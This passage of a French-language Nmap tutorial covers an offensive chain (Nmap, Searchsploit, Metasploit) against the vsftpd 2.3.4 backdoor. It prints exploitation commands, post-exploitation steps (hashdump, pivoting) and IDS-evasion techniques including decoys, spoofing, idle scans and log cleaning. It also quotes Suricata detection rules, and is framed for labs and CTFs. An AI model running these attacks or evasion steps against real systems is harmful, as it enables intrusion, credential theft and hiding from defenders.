#### Configuration de la base de données PostgreSQL

```bash
# Démarrer le service PostgreSQL
sudo systemctl start postgresql

# Initialiser la base de données Metasploit
sudo msfdb init

# Vérifier le statut
sudo msfdb status
```

#### Utilisation de `db_nmap` dans Metasploit

```bash
# Lancer Metasploit
sudo msfconsole

# Vérifier la connexion à la base de données
msf6 > db_status

# Scanner avec db_nmap
msf6 > db_nmap -sV 192.168.1.1

# Voir les hôtes découverts
msf6 > hosts

# Voir les services découverts
msf6 > services

# Filtrer les services
msf6 > services -p 21-25,80,443

# Rechercher des exploits pour les services découverts
msf6 > search type:exploit name:apache httpd 2.4
```

#### Workflow complet dans Metasploit

```bash
# Lancer Metasploit
sudo msfconsole

# Scanner un réseau
msf6 > db_nmap -sV -sS -T4 192.168.1.0/24

# Identifier les cibles potentielles
msf6 > services -p 21,22,80,443

# Sélectionner un exploit
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor

# Configurer l'exploit
msf6 > set RHOSTS 192.168.1.10
msf6 > set RPORT 21

# Exécuter l'exploit
msf6 > exploit
```

### Chaîne Nmap → Searchsploit → Metasploit

Cette chaîne d'outils permet d'identifier et d'exploiter des vulnérabilités de manière méthodique.

#### Exemple avec VSFTPD 2.3.4

1. **Scan avec Nmap**

```bash
# Scan détaillé avec détection de version
sudo nmap -sS -sV -p- 192.168.1.10 -oX scan.xml
```

Résultat :
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
```

2. **Recherche d'exploits avec Searchsploit**

```bash
# Recherche directe
searchsploit vsftpd 2.3.4

# Ou utilisation du fichier XML de Nmap
searchsploit --nmap scan.xml
```

Résultat :
```
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution     | unix/remote/17491.rb
---------------------------------------------- ---------------------------------
```

3. **Exploitation avec Metasploit**

```bash
# Lancer Metasploit
sudo msfconsole

# Rechercher l'exploit
msf6 > search vsftpd 2.3.4

# Utiliser l'exploit
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor

# Configurer l'exploit
msf6 > set RHOSTS 192.168.1.10
msf6 > set RPORT 21

# Exécuter l'exploit
msf6 > exploit
```

4. **Post-exploitation**

```bash
# Une fois l'accès obtenu, collecter des informations
meterpreter > sysinfo
meterpreter > getuid
meterpreter > hashdump

# Pivotement dans le réseau
meterpreter > run autoroute -s 192.168.2.0/24
```

### Comparatif : Nmap vs Masscan vs Rustscan

Ces trois outils ont des forces et faiblesses différentes pour la reconnaissance réseau.

#### Nmap

**Forces :**
- Très précis et fiable
- Nombreuses options et fonctionnalités
- Scripts NSE puissants
- Détection de version et d'OS

**Faiblesses :**
- Relativement lent pour les grands réseaux
- Consommation de ressources importante pour les scans intensifs

**Cas d'utilisation idéal :**
- Analyse approfondie d'un nombre limité de cibles
- Détection précise des services et vulnérabilités
- Pentests complets nécessitant des informations détaillées

```bash
# Scan typique Nmap
sudo nmap -sS -sV -O -p- -T4 192.168.1.1
```

#### Masscan

**Forces :**
- Extrêmement rapide (peut scanner Internet entier en moins d'une heure)
- Faible consommation de ressources
- Bonne pour les scans initiaux de grands réseaux

**Faiblesses :**
- Moins précis que Nmap
- Fonctionnalités limitées (pas de scripts, détection de version limitée)
- Peut générer beaucoup de trafic réseau

**Cas d'utilisation idéal :**
- Scan initial rapide de grands réseaux
- Identification préliminaire des hôtes actifs et ports ouverts
- Reconnaissance à grande échelle

```bash
# Installation
sudo apt install masscan

# Scan typique Masscan
sudo masscan -p1-65535 192.168.1.0/24 --rate=10000

# Masscan avec sortie au format Nmap
sudo masscan -p1-65535 192.168.1.0/24 --rate=10000 -oX masscan.xml
```

#### Rustscan

**Forces :**
- Très rapide (écrit en Rust)
- Interface simple
- Intégration avec Nmap pour les détails
- Faible consommation de ressources

**Faiblesses :**
- Moins mature que Nmap
- Dépend de Nmap pour les fonctionnalités avancées
- Peut être moins stable sur certains systèmes

**Cas d'utilisation idéal :**
- Scan rapide initial suivi d'une analyse Nmap détaillée
- Environnements avec ressources limitées
- Utilisateurs cherchant un équilibre entre vitesse et précision

```bash
# Installation
sudo apt install rustscan

# Scan typique Rustscan
rustscan -a 192.168.1.0/24 -- -sV -sC

# Scan rapide suivi de Nmap détaillé
rustscan -a 192.168.1.1 -r 1-65535 -- -sV -sC -A
```

### Workflow offensif optimisé

Voici un workflow complet combinant ces outils pour une reconnaissance et exploitation efficaces :

1. **Scan rapide initial avec Rustscan ou Masscan**

```bash
# Avec Rustscan
rustscan -a 10.10.10.0/24 -b 1000 -t 5000 --ulimit 5000

# Ou avec Masscan
sudo masscan -p1-65535 10.10.10.0/24 --rate=10000 -oX masscan_initial.xml
```

2. **Analyse détaillée avec Nmap sur les cibles identifiées**

```bash
# Extraire les cibles de Masscan
targets=$(grep -oP 'addr="\K[^"]+' masscan_initial.xml | sort -u)

# Scan Nmap détaillé
sudo nmap -sV -sC -O -p- -T4 $targets -oX nmap_detailed.xml
```

3. **Recherche de vulnérabilités avec Searchsploit**

```bash
searchsploit --nmap nmap_detailed.xml
```

4. **Import dans Metasploit et exploitation**

```bash
# Dans Metasploit
msf6 > db_import nmap_detailed.xml
msf6 > hosts
msf6 > services
msf6 > vulns

# Sélection et exploitation des vulnérabilités identifiées
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 > set RHOSTS 10.10.10.10
msf6 > exploit
```

5. **Post-exploitation et pivotement**

```bash
# Collecte d'informations
meterpreter > sysinfo
meterpreter > getuid
meterpreter > run post/multi/gather/local_admin_search

# Pivotement
meterpreter > run autoroute -s 10.10.11.0/24
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 9050
msf6 > run
```

6. **Documentation des résultats**

```bash
# Génération de rapport HTML à partir du scan Nmap
xsltproc nmap_detailed.xml -o rapport_scan.html

# Capture d'écran des preuves de compromission
meterpreter > screenshot
```

### Exemple concret : Exploitation de VSFTPD 2.3.4

Voici un exemple pas à pas d'exploitation de la backdoor VSFTPD 2.3.4, une vulnérabilité classique souvent présente dans les CTF et labs.

1. **Découverte avec Nmap**

```bash
# Scan initial
sudo nmap -sS -sV 10.10.10.10 -p 21
```

Résultat :
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
```

2. **Vérification de la vulnérabilité**

```bash
# Test de connexion FTP
ftp 10.10.10.10
> USER backdoor:)
> PASS anypassword
```

3. **Exploitation avec Metasploit**

```bash
# Lancer Metasploit
sudo msfconsole

# Utiliser l'exploit
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 > set RHOSTS 10.10.10.10
msf6 > exploit
```

4. **Exploitation manuelle (sans Metasploit)**

```bash
# Déclencher la backdoor
ftp 10.10.10.10
> USER backdoor:)
> PASS anypassword

# Dans un autre terminal, se connecter au shell
nc 10.10.10.10 6200
```

5. **Élévation de privilèges**

```bash
# Vérifier l'utilisateur actuel
whoami

# Rechercher des binaires SUID
find / -perm -u=s -type f 2>/dev/null

# Exploiter un binaire SUID si trouvé
python -c 'import pty; pty.spawn("/bin/bash")'
```

**En clair, pour un débutant :** L'intégration offensive signifie utiliser Nmap comme première étape d'une attaque. D'abord, vous scannez avec Nmap pour trouver les services vulnérables. Ensuite, vous utilisez Searchsploit pour chercher des exploits connus pour ces services. Enfin, vous utilisez Metasploit pour exploiter ces vulnérabilités et obtenir un accès. C'est comme une chaîne : reconnaissance (Nmap) → recherche d'exploits (Searchsploit) → exploitation (Metasploit). Pour les grands réseaux, vous pouvez commencer avec des scanners plus rapides comme Masscan ou Rustscan, puis utiliser Nmap pour les détails.

## 9. OPSEC & Évasion avancée

Les techniques d'OPSEC (Operations Security) et d'évasion permettent de réaliser des scans plus discrets, en contournant les systèmes de détection d'intrusion (IDS) et les pare-feu. Cette section est cruciale pour les tests d'intrusion réalistes et les CTF avancés.

### Timing (`-T0` à `-T5`)

Le contrôle du timing est l'une des techniques d'évasion les plus basiques mais efficaces.

```bash
# Scan extrêmement lent (paranoïaque)
sudo nmap -T0 192.168.1.1

# Scan très lent (furtif)
sudo nmap -T1 192.168.1.1

# Scan normal (par défaut)
sudo nmap -T3 192.168.1.1

# Scan rapide (agressif)
sudo nmap -T4 192.168.1.1

# Scan très rapide (insane)
sudo nmap -T5 192.168.1.1
```

#### Impact sur la détection

| Niveau | Délai entre paquets | Détectabilité | Utilisation recommandée |
|--------|---------------------|---------------|-------------------------|
| T0 | 5 minutes | Très faible | Environnements hautement surveillés, IDS sophistiqués |
| T1 | 15 secondes | Faible | Pentests professionnels, éviter les alertes |
| T2 | 0.4 secondes | Modérée | Scans discrets en environnement sensible |
| T3 | 0.1 secondes | Normale | Usage quotidien, équilibre vitesse/discrétion |
| T4 | 10 millisecondes | Élevée | Réseaux internes, CTF, labs |
| T5 | Minimal | Très élevée | Tests rapides, environnements contrôlés uniquement |

#### Paramètres de timing avancés

Pour un contrôle encore plus fin, vous pouvez ajuster manuellement les paramètres de timing :

```bash
# Délai minimum entre sondes (en millisecondes)
sudo nmap --min-rate 100 192.168.1.1

# Délai maximum entre sondes (en millisecondes)
sudo nmap --max-rate 500 192.168.1.1

# Nombre maximum de sondes parallèles
sudo nmap --min-parallelism 10 192.168.1.1
sudo nmap --max-parallelism 30 192.168.1.1

# Délai d'attente pour les réponses (en millisecondes)
sudo nmap --min-rtt-timeout 1000 192.168.1.1
sudo nmap --max-rtt-timeout 5000 192.168.1.1

# Délai entre les tentatives de retransmission
sudo nmap --initial-rtt-timeout 500 192.168.1.1
```

### Decoys (`--decoy`)

La technique des leurres (decoys) consiste à faire croire que le scan provient de plusieurs sources différentes, rendant difficile l'identification de la véritable source.

```bash
# Utiliser des leurres spécifiques
sudo nmap -sS -D 10.0.0.1,10.0.0.2,ME,10.0.0.3 192.168.1.1

# Utiliser des leurres aléatoires (RND génère des IPs aléatoires)
sudo nmap -sS -D RND:5,ME 192.168.1.1

# Utiliser des leurres sans inclure votre IP (ME est omis)
sudo nmap -sS -D RND:10 192.168.1.1
```

#### Comment ça fonctionne

```
# Diagramme de fonctionnement des decoys
                    
  ATTAQUANT    LEURRES (DECOYS)    CIBLE
      |              |              |
      |              |              |
      |------ SYN ---------------->|  # Paquet SYN de l'attaquant
      |              |              |
      |   |-- SYN -->|              |  # Paquets SYN des leurres
      |   |-- SYN -->|              |  # (simulés par l'attaquant)
      |   |-- SYN -->|              |
      |              |              |
      |<---- SYN/ACK --------------|  # La cible répond à tous les SYN
      |              |<-- SYN/ACK --|  # (mais seul l'attaquant voit sa réponse)
      |              |<-- SYN/ACK --|
      |              |              |
```

#### Comment repérer le vrai hôte

Les défenseurs peuvent parfois identifier le véritable attaquant parmi les leurres :
- Le vrai hôte est généralement le seul à recevoir les réponses (les autres IPs sont souvent inexistantes ou inactives)
- Les paquets du vrai hôte arrivent souvent avec un timing légèrement différent
- Certains IDS avancés peuvent détecter les incohérences dans les TTL ou les fenêtres TCP

### Spoofing MAC (`--spoof-mac`)

Cette technique permet de masquer votre adresse MAC réelle, utile pour les scans sur le réseau local.

```bash
# Utiliser une MAC spécifique
sudo nmap --spoof-mac 00:11:22:33:44:55 192.168.1.1

# Utiliser une MAC d'un fabricant connu
sudo nmap --spoof-mac Cisco 192.168.1.1

# Utiliser une MAC aléatoire
sudo nmap --spoof-mac 0 192.168.1.1
```

#### Limitations

- Ne fonctionne que sur le réseau local (couche 2)
- Inefficace pour les scans à travers Internet
- Peut être détecté si le switch utilise le port security ou le MAC filtering
- Les réponses seront envoyées à la MAC usurpée, pas à votre MAC réelle

### Source-port & data-length

#### Source-port (`--source-port`)

Certains pare-feu autorisent le trafic provenant de ports spécifiques considérés comme "de confiance".

```bash
# Utiliser le port DNS comme port source
sudo nmap --source-port 53 192.168.1.1

# Utiliser le port HTTP comme port source
sudo nmap --source-port 80 192.168.1.1

# Combiner avec un scan SYN
sudo nmap -sS --source-port 53 192.168.1.1
```

#### Data-length (`--data-length`)

Modifier la taille des paquets peut aider à contourner certains systèmes de détection qui se basent sur des signatures de taille de paquet.

```bash
# Ajouter des données aléatoires aux paquets
sudo nmap --data-length 25 192.168.1.1

# Ajouter plus de données pour rendre les paquets moins reconnaissables
sudo nmap --data-length 200 192.168.1.1
```

### Fragmentation (`-f`, `--mtu`)

La fragmentation divise les paquets TCP en plusieurs petits fragments, ce qui peut aider à contourner certains pare-feu et IDS qui n'inspectent pas correctement les paquets fragmentés.

```bash
# Fragmentation standard (8 octets)
sudo nmap -f 192.168.1.1

# Fragmentation double (16 octets)
sudo nmap -ff 192.168.1.1

# Fragmentation personnalisée (multiple de 8)
sudo nmap --mtu 24 192.168.1.1
```

#### Limites et risques

- Certains pare-feu modernes réassemblent les fragments avant inspection
- Peut ralentir considérablement le scan
- Peut causer des problèmes sur certains réseaux qui bloquent la fragmentation
- Peut générer des alertes spécifiques sur les IDS qui détectent la fragmentation excessive

### Idle / Zombie scan (`-sI`)

Le scan Idle (ou Zombie) est l'une des techniques d'évasion les plus avancées. Il utilise un hôte tiers (zombie) pour effectuer le scan, rendant l'attaquant totalement invisible pour la cible.

```bash
# Scan Idle basique
sudo nmap -sI zombie_host:open_port target_host

# Exemple concret
sudo nmap -sI 192.168.1.5:80 192.168.1.1

# Avec options supplémentaires
sudo nmap -sI 192.168.1.5:80 -p 22,80,443 192.168.1.1
```

#### Fonctionnement détaillé de l'IPID

Le scan Idle repose sur le comportement de l'IPID (IP Identification), un champ de 16 bits dans l'en-tête IP qui est incrémenté pour chaque paquet envoyé par un hôte.

```
# Étapes du scan Idle

1. Vérification de l'IPID initial du zombie
   Attaquant -> Zombie : Sonde SYN/ACK
   Zombie -> Attaquant : RST avec IPID=x

2. Scan d'un port de la cible en usurpant l'adresse du zombie
   Attaquant -> Cible : SYN (IP source = Zombie)
   
   Si port ouvert:
   Cible -> Zombie : SYN/ACK
   Zombie -> Cible : RST (IPID incrémenté)
   
   Si port fermé:
   Cible -> Zombie : RST (pas d'incrémentation d'IPID)

3. Vérification de l'IPID final du zombie
   Attaquant -> Zombie : Sonde SYN/ACK
   Zombie -> Attaquant : RST avec IPID=y
   
   Si y = x+1 : port fermé ou filtré
   Si y = x+2 : port ouvert
```

#### Conditions pour un scan Idle réussi

- Le zombie doit avoir un IPID prévisible et incrémental
- Le zombie doit être inactif (pas de trafic réseau pendant le scan)
- Le zombie doit être accessible par l'attaquant et la cible
- Le zombie ne doit pas avoir de pare-feu bloquant les paquets SYN/ACK entrants

#### Trouver un bon zombie

```bash
# Vérifier si un hôte peut être utilisé comme zombie
sudo nmap -O -v 192.168.1.5

# Utiliser le script ipidseq pour vérifier le comportement IPID
sudo nmap --script ipidseq 192.168.1.5

# Bons candidats pour les zombies:
# - Imprimantes réseau
# - Systèmes Windows anciens
# - Serveurs peu utilisés
# - Équipements réseau avec trafic minimal
```

### OPSEC checklist

Voici une liste de vérification pour maximiser la discrétion de vos scans :

#### Préparation
- [ ] Vérifier les autorisations légales (scope du pentest)
- [ ] Identifier les systèmes de sécurité potentiels (IDS/IPS, WAF, SIEM)
- [ ] Planifier les horaires de scan (préférer les périodes de forte activité réseau)
- [ ] Préparer une infrastructure anonyme si nécessaire (VPN, proxy)

#### Configuration du scan
- [ ] Utiliser un timing lent (`-T1` ou `-T2`)
- [ ] Éviter le ping de découverte (`-Pn`)
- [ ] Limiter le nombre de ports scannés (cibler les plus importants)
- [ ] Utiliser des decoys (`-D`)
- [ ] Modifier l'user-agent HTTP pour les scripts NSE

```bash
# Éviter le ping de découverte
sudo nmap -Pn 192.168.1.1

# Modifier l'user-agent HTTP
sudo nmap --script http-headers --script-args http.useragent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" 192.168.1.1
```

#### Pendant le scan
- [ ] Surveiller les logs de votre propre système
- [ ] Répartir les scans sur plusieurs sessions
- [ ] Alterner entre différentes techniques
- [ ] Éviter les scripts NSE intrusifs

#### Après le scan
- [ ] Nettoyer les logs locaux
- [ ] Vérifier qu'aucune connexion persistante n'est maintenue
- [ ] Documenter les techniques utilisées pour le rapport

### Vue Blue Team : signatures et détection

Comprendre comment les équipes de défense détectent les scans Nmap vous aide à améliorer vos techniques d'évasion.

#### Signatures Suricata (IDS)

Voici quelques exemples de règles Suricata qui détectent les scans Nmap :

```
# Détection de scan SYN
alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"ET SCAN Nmap SYN Scan"; flow:stateless; flags:S,12; window:1024; tcp.mss:1460; threshold:type threshold, track by_src, count 5, seconds 60; classtype:attempted-recon; sid:2100623; rev:7;)

# Détection de scan Xmas
alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"ET SCAN NMAP XMAS Scan"; flow:stateless; flags:FPU,12; threshold:type threshold, track by_src, count 5, seconds 60; classtype:attempted-recon; sid:2100626; rev:6;)

# Détection de scan NULL
alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"ET SCAN NMAP NULL Scan"; flow:stateless; flags:0,12; threshold:type threshold, track by_src, count 5, seconds 60; classtype:attempted-recon; sid:2100627; rev:6;)

# Détection de scan FIN
alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"ET SCAN NMAP FIN Scan"; flow:stateless; flags:F,12; threshold:type threshold, track by_src, count 5, seconds 60; classtype:attempted-recon; sid:2100628; rev:6;)
```

#### Empreintes JA3

JA3 est une méthode de fingerprinting des clients TLS, utilisée pour détecter les outils automatisés comme Nmap.

```
# Empreinte JA3 typique de Nmap lors de scans SSL
e7d705a3286e19ea42f587b344ee6865
```

Pour éviter cette détection, utilisez l'option `--script-args http.useragent` et modifiez les paramètres SSL dans vos scripts NSE.

#### NetFlow et beaconing

Les systèmes de surveillance NetFlow peuvent détecter les modèles de trafic réguliers (beaconing) générés par Nmap.

Techniques pour éviter la détection par NetFlow :
- Utiliser des délais aléatoires entre les paquets (`--scan-delay rand:10000,15000`)
- Répartir les scans sur plusieurs sessions et plusieurs jours
- Cibler différentes parties du réseau à différents moments
- Combiner avec d'autres types de trafic légitime

### Techniques d'évasion combinées

Pour une discrétion maximale, combinez plusieurs techniques d'évasion :

```bash
# Scan ultra-furtif
sudo nmap -sS -Pn -T1 -f --data-length 200 --randomize-hosts --source-port 53 -D RND:10 --spoof-mac Cisco --script-args http.useragent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" 192.168.1.0/24 -p 22,80,443

# Scan Idle avec fragmentation et timing lent
sudo nmap -sI 192.168.1.5:80 -Pn -f --mtu 16 -T1 --data-length 25 192.168.1.1 -p 80,443

# Scan distribué (plusieurs terminaux/machines)
# Terminal 1:
sudo nmap -sS -Pn -T2 -p 1-1000 192.168.1.1
# Terminal 2:
sudo nmap -sS -Pn -T2 -p 1001-2000 192.168.1.1
# Terminal 3:
sudo nmap -sS -Pn -T2 -p 2001-3000 192.168.1.1
```

### Exemples de scénarios réels

#### Scénario 1 : Pentest avec IDS sophistiqué

```bash
# Phase 1: Scan lent et discret pour la découverte initiale
sudo nmap -sS -Pn -T1 --source-port 53 -D RND:5 --data-length 25 -p 80,443,22,21,3389 192.168.1.0/24 -oA phase1

# Phase 2: Scan ciblé des hôtes découverts
for host in $(grep "Up" phase1.gnmap | cut -d " " -f 2); do
  sudo nmap -sV -Pn -T2 --source-port 80 -f --script "safe and discovery" $host -p $(grep $host phase1.gnmap | grep -oP "(\d+)/open" | cut -d "/" -f 1 | tr '\n' ',') -oA phase2_$host
  sleep $((RANDOM % 300 + 60))
done
```

#### Scénario 2 : CTF avec WAF et détection de scan

```bash
# Scan initial avec Idle scan
sudo nmap -sI 10.10.10.5:53 10.10.10.10 -p 80,443

# Scan de version discret
sudo nmap -sV -Pn -T2 --source-port 443 --script-args http.useragent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124" 10.10.10.10 -p 80,443

# Scan de vulnérabilités ciblé
sudo nmap -Pn -T2 --script "vuln and safe" --script-args http.useragent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124" 10.10.10.10 -p 80
```

**En clair, pour un débutant :** Les techniques d'évasion permettent de rendre vos scans Nmap plus discrets pour éviter d'être détecté. On maquille ou ralentit le scan pour passer sous le radar des systèmes de sécurité. Le timing (`-T0` à `-T5`) contrôle la vitesse du scan, les decoys font croire que le scan vient de plusieurs sources, le spoofing MAC cache votre identité sur le réseau local. La fragmentation découpe les paquets en morceaux plus difficiles à analyser. Le scan Idle est le plus furtif : il utilise un autre ordinateur comme "zombie" pour scanner à votre place, vous rendant invisible. Toutes ces techniques ont des limites et doivent être utilisées de façon légale et éthique.

## 10. Automatisation & tuning

Pour les scans de grande envergure ou les tâches répétitives, l'automatisation et l'optimisation (tuning) de Nmap sont essentielles.

### Utilisation de fichiers cibles (`-iL`)

Plutôt que de taper de longues listes d'IPs ou de réseaux, vous pouvez les stocker dans un fichier et le passer à Nmap.

```bash
# Créer un fichier de cibles (cibles.txt)
192.168.1.1
192.168.1.10-20
10.0.0.0/24
example.com
```

```bash
# Utiliser le fichier de cibles
nmap -iL cibles.txt -sV -T4 -oA scan_liste
```

### Exclusion de cibles (`--exclude`, `--excludefile`)

Il est souvent nécessaire d'exclure certaines cibles du scan (par exemple, des systèmes critiques ou des machines de surveillance).

```bash
# Exclure une IP spécifique
nmap 192.168.1.0/24 --exclude 192.168.1.100

# Exclure plusieurs IPs
nmap 192.168.1.0/24 --exclude 192.168.1.100,192.168.1.101

# Exclure un sous-réseau
nmap 192.168.0.0/16 --exclude 192.168.1.0/24
```

Vous pouvez également utiliser un fichier d'exclusion :

```bash
# Créer un fichier d'exclusion (exclude.txt)
192.168.1.100
192.168.1.200-210
10.0.1.0/24
```

```bash
# Utiliser le fichier d'exclusion
nmap 192.168.0.0/16 --excludefile exclude.txt
```

### Planification avec `cron`

`cron` est un utilitaire Linux qui permet de planifier l'exécution de tâches à des intervalles réguliers. C'est utile pour des scans de surveillance périodiques.

```bash
# Ouvrir l'éditeur crontab
crontab -e
```

Ajouter une ligne pour planifier un scan Nmap. La syntaxe est : `minute heure jour_du_mois mois jour_de_la_semaine commande`

```crontab
# Exécuter un scan Nmap tous les jours à 2h du matin
# Rediriger la sortie vers un fichier daté
0 2 * * * /usr/bin/nmap -sS -T4 -oA /home/ubuntu/scans/scan_$(date +\%Y-\%m-\%d) 192.168.1.0/24 > /dev/null 2>&1

# Exécuter un scan rapide toutes les heures
0 * * * * /usr/bin/nmap -F -T4 -oN /home/ubuntu/scans/quick_scan_$(date +\%Y-\%m-\%d_\%H\%M) 192.168.1.0/24 > /dev/null 2>&1
```

**Points importants pour `cron` :**
- Utilisez les chemins absolus pour Nmap (`/usr/bin/nmap`) et les fichiers de sortie.
- Assurez-vous que l'utilisateur `cron` a les permissions nécessaires (par exemple, pour les scans SYN, Nmap doit être exécuté en tant que root ou avec les capacités appropriées).
- Redirigez la sortie standard et d'erreur (`> /dev/null 2>&1`) pour éviter les emails de `cron`.
- Échappez les caractères spéciaux comme `%` avec un backslash (`\%`).

### Wrappers Bash/Python

Les wrappers sont des scripts qui "enveloppent" la commande Nmap pour ajouter des fonctionnalités, simplifier l'utilisation ou automatiser des workflows complexes.

#### Wrapper Bash simple

Ce script Bash prend une liste de cibles en argument, effectue un scan Nmap standard et enregistre la sortie.

```bash
#!/bin/bash

# Vérifier si des cibles sont fournies
if [ $# -eq 0 ]; then
  echo "Usage: $0 <cible1> [cible2] ..."
  exit 1
fi

# Définir le nom du fichier de sortie basé sur la date
OUTPUT_FILE="nmap_scan_$(date +%Y%m%d_%H%M%S).xml"
LOG_FILE="nmap_wrapper.log"

echo "[$(date)] Début du scan Nmap pour les cibles: $@" >> $LOG_FILE

# Exécuter Nmap
sudo nmap -sS -sV -T4 -oX $OUTPUT_FILE "$@" >> $LOG_FILE 2>&1

# Vérifier si le scan a réussi
if [ $? -eq 0 ]; then
  echo "[$(date)] Scan Nmap terminé avec succès. Résultats dans $OUTPUT_FILE" >> $LOG_FILE
  echo "Scan terminé. Résultats enregistrés dans $OUTPUT_FILE"
else
  echo "[$(date)] Erreur lors du scan Nmap." >> $LOG_FILE
  echo "Erreur lors du scan Nmap. Consultez $LOG_FILE pour plus de détails."
  exit 1
fi

exit 0
```

Pour l'utiliser :

```bash
chmod +x nmap_wrapper.sh
./nmap_wrapper.sh 192.168.1.1 192.168.1.10
```

#### Wrapper Python simple (avec `subprocess`)

Ce script Python utilise le module `subprocess` pour exécuter Nmap et traiter la sortie.

```python
#!/usr/bin/env python3
import subprocess
import sys
import shlex
from datetime import datetime

def run_nmap_scan(targets):
    """Exécute un scan Nmap sur les cibles fournies."""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_xml = f"nmap_scan_{timestamp}.xml"
    log_file = "nmap_wrapper_python.log"

    # Construire la commande Nmap
    # Utiliser sudo est nécessaire pour les scans SYN (-sS)
    # Assurez-vous que l'utilisateur exécutant le script a les droits sudo
    # ou configurez sudoers pour autoriser cette commande sans mot de passe.
    command = f"sudo nmap -sS -sV -T4 -oX {output_xml} {' '.join(targets)}"
    
    log_message = f"[{datetime.now()}] Début du scan Nmap: {command}\n"
    print(log_message.strip())
    with open(log_file, "a") as log:
        log.write(log_message)

    try:
        # Exécuter la commande
        # Utiliser shlex.split pour gérer correctement les arguments
        process = subprocess.run(shlex.split(command), check=True, capture_output=True, text=True)
        
        log_message = f"[{datetime.now()}] Scan Nmap terminé avec succès.\n"
        log_message += f"STDOUT:\n{process.stdout}\n"
        print("Scan terminé avec succès.")
        print(f"Résultats enregistrés dans {output_xml}")
        
    except subprocess.CalledProcessError as e:
        log_message = f"[{datetime.now()}] Erreur lors du scan Nmap (code {e.returncode}).\n"
        log_message += f"STDERR:\n{e.stderr}\n"
        print(f"Erreur lors du scan Nmap (code {e.returncode}). Consultez {log_file}")
        
    except FileNotFoundError:
        log_message = f"[{datetime.now()}] Erreur: Commande 'sudo' ou 'nmap' non trouvée. Assurez-vous qu'elles sont installées et dans le PATH.\n"
        print("Erreur: Commande 'sudo' ou 'nmap' non trouvée.")
        
    except Exception as e:
        log_message = f"[{datetime.now()}] Erreur inattendue: {e}\n"
        print(f"Erreur inattendue: {e}")

    with open(log_file, "a") as log:
        log.write(log_message)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <cible1> [cible2] ...")
        sys.exit(1)
    
    targets_to_scan = sys.argv[1:]
    run_nmap_scan(targets_to_scan)
```

Pour l'utiliser :

```bash
python3 nmap_wrapper.py 192.168.1.1 192.168.1.10
```

**En clair, pour un débutant :** L'automatisation permet de lancer des scans Nmap sans avoir à taper les commandes à chaque fois. Vous pouvez mettre une liste d'ordinateurs à scanner dans un fichier (`-iL`) ou exclure certains ordinateurs (`--exclude`). Avec `cron`, vous pouvez programmer des scans réguliers (par exemple, tous les soirs). Les wrappers sont des petits scripts (en Bash ou Python) qui lancent Nmap pour vous, ajoutant parfois des étapes comme enregistrer les résultats avec la date.

## 11. Troubleshooting & erreurs courantes

Même les utilisateurs expérimentés rencontrent parfois des problèmes avec Nmap. Voici quelques erreurs courantes et comment les résoudre.

### `Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn`

**Cause :** Par défaut, Nmap effectue une découverte d'hôtes (ping scan) avant de scanner les ports. Si la cible ne répond pas aux pings (par exemple, à cause d'un pare-feu), Nmap la considère comme hors ligne et ne scanne pas ses ports.

**Solution :** Utilisez l'option `-Pn` pour forcer Nmap à scanner les ports même si la cible ne répond pas au ping.

```bash
# Ignorer la découverte d'hôtes
sudo nmap -Pn 192.168.1.1
```

**En clair, pour un débutant :** Nmap essaie d'abord de "pinguer" la cible pour voir si elle est allumée. Si la cible bloque les pings (comme ignorer quelqu'un qui frappe à la porte), Nmap pense qu'elle est éteinte. L'option `-Pn` dit à Nmap : "Ignore le ping, essaie quand même de scanner les ports".

### `WARNING: RST from 192.168.1.1 port 80; assuming close`

**Cause :** Ce n'est pas une erreur, mais un avertissement courant lors des scans SYN (`-sS`). Nmap reçoit un paquet RST (Reset) de la cible, ce qui indique généralement que le port est fermé.

**Solution :** Aucune action nécessaire, c'est le comportement attendu pour un port fermé lors d'un scan SYN.

**En clair, pour un débutant :** Ce message signifie simplement que Nmap a frappé à une porte (port) et que la cible a répondu "Non, c'est fermé" (en envoyant un paquet RST). C'est normal.

### `RTTVAR has grown to over 2.3 seconds, decreasing parallelism`

**Cause :** Nmap ajuste dynamiquement sa vitesse en fonction de la latence du réseau et du temps de réponse de la cible. Si les réponses deviennent trop lentes ou irrégulières, Nmap ralentit pour éviter de surcharger la cible ou le réseau, et pour améliorer la précision.

**Solution :** Aucune action directe n'est généralement requise. Si le scan devient trop lent, vous pouvez essayer d'ajuster manuellement les options de temporisation (`-T`, `--min-rate`, etc.), mais cela peut réduire la précision ou augmenter la charge sur la cible.

**En clair, pour un débutant :** Nmap s'adapte à la vitesse du réseau. Si les réponses de la cible prennent trop de temps, Nmap ralentit automatiquement pour être plus fiable. C'est comme ajuster sa vitesse de conduite en fonction du trafic.

### `Failed to resolve "hostname".`

**Cause :** Nmap n'arrive pas à convertir un nom d'hôte (comme `example.com`) en adresse IP. Cela peut être dû à une faute de frappe, un problème avec votre serveur DNS, ou le nom d'hôte qui n'existe pas.

**Solution :**
1. Vérifiez l'orthographe du nom d'hôte.
2. Essayez de résoudre le nom d'hôte manuellement avec `ping hostname` ou `nslookup hostname`.
3. Vérifiez votre configuration réseau et DNS (`/etc/resolv.conf` sur Linux).
4. Essayez d'utiliser une adresse IP directement si possible.

